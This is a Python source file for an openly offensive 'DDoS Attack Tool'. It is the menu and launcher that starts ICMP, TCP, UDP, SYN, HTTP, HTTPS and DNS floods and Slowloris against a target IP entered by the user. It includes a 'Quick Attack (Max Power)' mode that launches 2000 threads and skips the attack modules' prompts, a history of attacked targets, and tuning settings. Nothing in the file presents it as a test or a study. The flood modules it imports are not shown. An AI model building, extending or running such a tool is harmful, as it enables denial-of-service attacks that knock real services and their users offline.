import sys
import os
import time
from core.config import Config
from core.utils import AttackAnimation
from concurrent.futures import ThreadPoolExecutor

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREY = '\033[90m'
    BOLD_RED = '\033[1;91m'
    BOLD_GREY = '\033[1;90m'
    RESET = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    print("""
 ⠀⠀                                 ⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    ⣠⣾⡿⣇⣠⣶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣠⣾⣿⡿⠁⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣰⣿⣿⠏⠃⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣶⣤⣴⣿⣿⡏⢀⣀⣀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠔⠛⠛⢛⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡈⠻⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠛⢉⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠯⠭⠉⠛⠻⠿⣿⣿⠿⣶⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⡿⢋⣠⣤⠀⠀⠀⠀⠀⠀⠀⠉⠑⠂⠉⠉⠛⠛⠛⠿⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡿⣿⣿⣿⣿⣿⣇⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⠀⠸⣿⣿⣿⣿⣿⣿⣿⣮⣧⠀⠀⠀⠀⢿⡿⠿⠿⠟⠫⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⢻⣿⣿⣿⣿⢿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠿⣿⠀⠙⣿⣿⣏⠙⠛⢿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠈⠻⣿⡄⠀⠀⠈⠻⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠄⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")

def print_menu():
    clear_screen()
    print_header()
    print("\n" + Colors.BOLD_RED + "                      MAIN MENU" + Colors.RESET)
    print()
    print(Colors.BOLD_GREY + "  LAYER 3 - NETWORK LAYER" + Colors.RESET)
    print(Colors.RED + "  [1] ICMP Flood" + Colors.GREY + "     - Network layer ping flood" + Colors.RESET)
    print()
    print(Colors.BOLD_GREY + "  LAYER 4 - TRANSPORT LAYER" + Colors.RESET)
    print(Colors.RED + "  [2] TCP Flood" + Colors.GREY + "      - Protocol based connection flood" + Colors.RESET)
    print(Colors.RED + "  [3] UDP Flood" + Colors.GREY + "      - High volume packet flood" + Colors.RESET)
    print(Colors.RED + "  [4] SYN Flood" + Colors.GREY + "      - TCP SYN packet flood" + Colors.RESET)
    print()
    print(Colors.BOLD_GREY + "  LAYER 7 - APPLICATION LAYER" + Colors.RESET)
    print(Colors.RED + "  [5] HTTP Flood" + Colors.GREY + "     - Web application layer attack" + Colors.RESET)
    print(Colors.RED + "  [6] HTTPS Flood" + Colors.GREY + "    - Secure web application attack" + Colors.RESET)
    print(Colors.RED + "  [7] DNS Flood" + Colors.GREY + "      - DNS server amplification attack" + Colors.RESET)
    print(Colors.RED + "  [8] Slowloris" + Colors.GREY + "       - Slow HTTP connection exhaustion" + Colors.RESET)
    print()
    print(Colors.BOLD_GREY + "  QUICK ATTACK (MAX POWER)" + Colors.RESET)
    print(Colors.RED + "  [99] Quick Attack" + Colors.GREY + "    - Target only, auto-max settings" + Colors.RESET)
    print()
    print(Colors.GREY + "  COMMANDS:" + Colors.RESET)
    print(Colors.RED + "  !help" + Colors.GREY + "          - Show this menu" + Colors.RESET)
    print(Colors.RED + "  !clear" + Colors.GREY + "         - Clear screen" + Colors.RESET)
    print()
    print(Colors.BOLD_GREY + "  UTILITIES" + Colors.RESET)
    print(Colors.RED + "  [9] View Attack History" + Colors.GREY + " - View recent attack logs" + Colors.RESET)
    print(Colors.RED + "  [10] Settings" + Colors.GREY + "         - Configure attack options" + Colors.RESET)
    print()
    print(Colors.RED + "  [0] Exit Program" + Colors.RESET)
    print()
    print(Colors.GREY + "  root@ddos-tool:~$ " + Colors.RESET, end="", flush=True)

def quick_attack():
    clear_screen()
    print("         QUICK ATTACK - MAX POWER")
    print()
    
    target = input("Target IP: ").strip()
    if not target:
        print("Target required!")
        input("\nPress Enter to return...")
        return
    
    print("\nSelect attack type:")
    print("  [1] TCP Flood")
    print("  [2] UDP Flood")
    print("  [3] HTTP Flood")
    print("  [4] HTTPS Flood")
    print("  [5] DNS Flood")
    print("  [6] SYN Flood")
    print()
    attack_type = input("Attack type (1-6): ").strip()
    
    # Max settings
    config = Config()
    config.set('tcp_nodelay', True)
    config.set('socket_buffer_size', 131072)
    config.set('random_payload', True)
    config.set('random_ports', True)
    
    threads = 2000
    duration = 120
    port = 80
    
    if attack_type == '1':
        from layer4.tcp import tcp_flood
        # Monkey patch to skip prompts
        from layer4 import tcp
        original_flood = tcp.tcp_flood
        tcp.tcp_flood = lambda: run_maximized_attack('TCP', target, port, threads, duration, tcp.TCPFlood)
        tcp.tcp_flood()
    elif attack_type == '2':
        from layer4.udp import udp_flood
        from layer4 import udp
        udp.udp_flood = lambda: run_maximized_attack('UDP', target, port, threads, duration, udp.UDPFlood)
        udp.udp_flood()
    elif attack_type == '3':
        from layer7.http import http_flood
        from layer7 import http
        http.http_flood = lambda: run_maximized_attack('HTTP', target, port, threads, duration, http.HTTPFlood)
        http.http_flood()
    elif attack_type == '4':
        from layer7.https import https_flood
        from layer7 import https
        https.https_flood = lambda: run_maximized_attack('HTTPS', target, 443, threads, duration, https.HTTPSFlood)
        https.https_flood()
    elif attack_type == '5':
        from layer7.dns import dns_flood
        from layer7 import dns
        dns.dns_flood = lambda: run_maximized_attack('DNS', target, 53, threads, duration, dns.DNSFlood)
        dns.dns_flood()
    elif attack_type == '6':
        from layer4.syn import syn_flood
        from layer4 import syn
        syn.syn_flood = lambda: run_maximized_attack('SYN', target, port, threads, duration, syn.SYNAttack)
        syn.syn_flood()
    else:
        print("Invalid attack type!")
        input("\nPress Enter to return...")

def run_maximized_attack(attack_name, target, port, threads, duration, attack_class):
    clear_screen()
    print(f"         {attack_name} FLOOD - MAX POWER")
    print()
    print(f"Target: {target}")
    print(f"Port: {port}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    print(f"Sockets/Thread: 20")
    print(f"TCP_NODELAY: ON")
    print(f"Buffer Size: 128KB")
    print()
    print("Starting attack...")

    # Verifică dacă attack_class acceptă payload_size
    try:
        attack = attack_class([target], port, threads, duration, 1400)
    except TypeError:
        # Dacă nu acceptă payload_size (ca ICMP), folosește fără
        attack = attack_class([target], threads, duration, 1400)

    attack.stats.start()
    animation = AttackAnimation()

    animation.print_target_status(target, "ONLINE", "Checking...")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(attack.attack) for _ in range(threads)]

        start_time = time.time()
        last_count = 0
        last_time = start_time

        while time.time() - start_time < duration:
            time.sleep(0.5)
            elapsed = time.time() - start_time
            current_count = attack.stats.packet_count

            current_time = time.time()
            time_diff = current_time - last_time
            if time_diff > 0:
                rps = (current_count - last_count) / time_diff
                attack.stats.update_rps(rps)
                smoothed_rps = attack.stats.get_smoothed_rps()
                animation.print_attack_status(target, current_count, 900, elapsed, "FLOODING")
                last_count = current_count
                last_time = current_time

        attack.running = False
        attack.stats.stop()

    print(f"\n\nAttack completed!")
    attack.stats.print_stats()
    input("\nPress Enter to return to main menu...")

def main():
    while True:
        print_menu()
        choice = input()
        
        if choice.lower() == '!help':
            print_menu()
        elif choice.lower() == '!clear':
            clear_screen()
            print(Colors.GREY + "Screen cleared. Type !help to see menu." + Colors.RESET)
            input("\nPress Enter to continue...")
        elif choice == '1':
            from layer3.icmp import icmp_flood
            icmp_flood()
        elif choice == '2':
            from layer4.tcp import tcp_flood
            tcp_flood()
        elif choice == '3':
            from layer4.udp import udp_flood
            udp_flood()
        elif choice == '4':
            from layer4.syn import syn_flood
            syn_flood()
        elif choice == '5':
            from layer7.http import http_flood
            http_flood()
        elif choice == '6':
            from layer7.https import https_flood
            https_flood()
        elif choice == '7':
            from layer7.dns import dns_flood
            dns_flood()
        elif choice == '8':
            from layer7.slowloris import slowloris
            slowloris()
        elif choice == '99':
            quick_attack()
        elif choice == '9':
            config = Config()
            clear_screen()
            print("         ATTACK HISTORY")
            print()
            
            if not config.attack_history:
                print("No attack history available.")
            else:
                for i, entry in enumerate(config.attack_history[-10:], 1):
                    print(f"\n[{i}] {entry.get('timestamp', 'N/A')}")
                    print(f"    Type: {entry.get('attack_type', 'N/A')}")
                    print(f"    Target: {entry.get('target', 'N/A')}")
                    stats = entry.get('stats', {})
                    print(f"    Packets: {stats.get('total_packets', 0):,}")
                    print(f"    Avg RPS: {stats.get('avg_rps', 0):.0f}")
                    print(f"    Duration: {stats.get('duration', 0):.2f}s")
            
            print()
            input("\nPress Enter to return to main menu...")
        elif choice == '10':
            config = Config()
            clear_screen()
            print("         SETTINGS")
            print()
            print(f"  [1] Random payload: {config.get('random_payload', True)}")
            print(f"  [2] Random ports: {config.get('random_ports', False)}")
            print(f"  [3] Connection pooling: {config.get('connection_pooling', True)}")
            print(f"  [4] Log enabled: {config.get('log_enabled', True)}")
            print(f"  [5] TCP_NODELAY: {config.get('tcp_nodelay', True)}")
            print(f"  [6] TCP_KEEPALIVE: {config.get('tcp_keepalive', True)}")
            print(f"  [7] Socket reuse: {config.get('socket_reuse', True)}")
            print(f"  [8] Socket buffer size: {config.get('socket_buffer_size', 262144)}")
            print(f"  [9] Timeout: {config.get('timeout', 1.0)}s")
            print()
            print("  [0] Back to main menu")
            print()
            print(Colors.GREY + "  root@ddos-tool:~$ " + Colors.RESET, end="", flush=True)
            
            setting_choice = input()

            if setting_choice == '1':
                current = config.get('random_payload', True)
                config.set('random_payload', not current)
                print(f"  Random payload: {not current}")
                time.sleep(1)
            elif setting_choice == '2':
                current = config.get('random_ports', False)
                config.set('random_ports', not current)
                print(f"  Random ports: {not current}")
                time.sleep(1)
            elif setting_choice == '3':
                current = config.get('connection_pooling', True)
                config.set('connection_pooling', not current)
                print(f"  Connection pooling: {not current}")
                time.sleep(1)
            elif setting_choice == '4':
                current = config.get('log_enabled', True)
                config.set('log_enabled', not current)
                print(f"  Log enabled: {not current}")
                time.sleep(1)
            elif setting_choice == '5':
                current = config.get('tcp_nodelay', True)
                config.set('tcp_nodelay', not current)
                print(f"  TCP_NODELAY: {not current}")
                time.sleep(1)
            elif setting_choice == '6':
                current = config.get('tcp_keepalive', True)
                config.set('tcp_keepalive', not current)
                print(f"  TCP_KEEPALIVE: {not current}")
                time.sleep(1)
            elif setting_choice == '7':
                current = config.get('socket_reuse', True)
                config.set('socket_reuse', not current)
                print(f"  Socket reuse: {not current}")
                time.sleep(1)
            elif setting_choice == '8':
                new_val = input("Enter socket buffer size (1024-1048576): ")
                try:
                    val = int(new_val)
                    if 1024 <= val <= 1048576:
                        config.set('socket_buffer_size', val)
                        print("  Setting updated!")
                    else:
                        print("  Value must be between 1024 and 1048576")
                except:
                    print("  Invalid input")
                time.sleep(1)
            elif setting_choice == '9':
                new_val = input("Enter timeout (0.1-5.0): ")
                try:
                    val = float(new_val)
                    if 0.1 <= val <= 5.0:
                        config.set('timeout', val)
                        print("  Setting updated!")
                    else:
                        print("  Value must be between 0.1 and 5.0")
                except:
                    print("  Invalid input")
                time.sleep(1)
            elif setting_choice == '0':
                pass
            else:
                print("  Invalid option")
                time.sleep(1)
        elif choice == '0':
            print("\n  Thank you for using DDoS Attack Tool. Goodbye!\n")
            time.sleep(1)
            sys.exit(0)
        else:
            print("\n  [!] Invalid option! Please try again.")
            print(Colors.GREY + "  Type !help for menu or !clear to clear screen." + Colors.RESET)
            time.sleep(1.5)

if __name__ == "__main__":
    main()
